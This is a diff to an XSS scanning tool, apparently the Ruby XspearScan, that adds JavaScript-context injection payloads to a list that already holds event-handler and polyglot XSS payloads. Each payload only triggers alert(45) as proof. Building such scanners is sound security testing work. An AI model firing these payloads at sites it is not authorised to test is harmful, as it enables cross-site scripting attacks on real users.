@@ -552,14 +552,17 @@ class XspearScan
     r.push makeQueryPattern('x', '"\'><audio src onloadstart=alert(45)>', '<audio src onloadstart=alert(45)>', 'h', "triggered ".yellow+"<audio src onloadstart=alert(45)>".red, CallbackXSSSelenium)
     r.push makeQueryPattern('x', '"\'><marquee onstart=alert(45)>', '<marquee onstart=alert(45)>', 'h', "triggered ".yellow+"<marquee onstart=alert(45)>".red, CallbackXSSSelenium)
     r.push makeQueryPattern('x', '"\'><svg/whatthe=""onload=alert(45)>', '<svg/whatthe=""onload=alert(45)>', 'h', "triggered ".yellow+"<svg/whatthe=""onload=alert(45)>".red, CallbackXSSSelenium)
+    # + in Javascript payloads
+    r.push makeQueryPattern('x', '\'+alert(45)+\'', 'alert(45)', 'h', "triggered ".yellow+"in JS".red, CallbackXSSSelenium)
+    r.push makeQueryPattern('x', '"+alert(45)+"', 'alert(45)', 'h', "triggered ".yellow+"in JS".red, CallbackXSSSelenium)
+    r.push makeQueryPattern('x', '\'%2Balert(45)%2B\'', 'alert(45)', 'h', "triggered ".yellow+"in JS".red, CallbackXSSSelenium)
+    r.push makeQueryPattern('x', '"%2Balert(45)%2B"', 'alert(45)', 'h', "triggered ".yellow+"in JS".red, CallbackXSSSelenium)
 
 
     # Check Selenium XSS Polyglot
     r.push makeQueryPattern('x', 'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert(45) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(45)//>\x3e', '\'"><svg/onload=alert(45)>', 'v', "triggered ".yellow+"XSS Polyglot payload".red, CallbackXSSSelenium)
     r.push makeQueryPattern('x', 'javascript:"/*`/*\"/*\' /*</stYle/</titLe/</teXtarEa/</nOscript></Script></noembed></select></template><FRAME/onload=/**/alert(45)//-->&lt;<sVg/onload=alert`45`>', '\'"><svg/onload=alert(45)>', 'v', "triggered ".yellow+"XSS Polyglot payload".red, CallbackXSSSelenium)
     r.push makeQueryPattern('x', 'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert(45)//>', '\'"><svg/onload=alert(45)>', 'v', "triggered ".yellow+"XSS Polyglot payload".red, CallbackXSSSelenium)
-
-
 
 
     # Check Blind XSS Payload
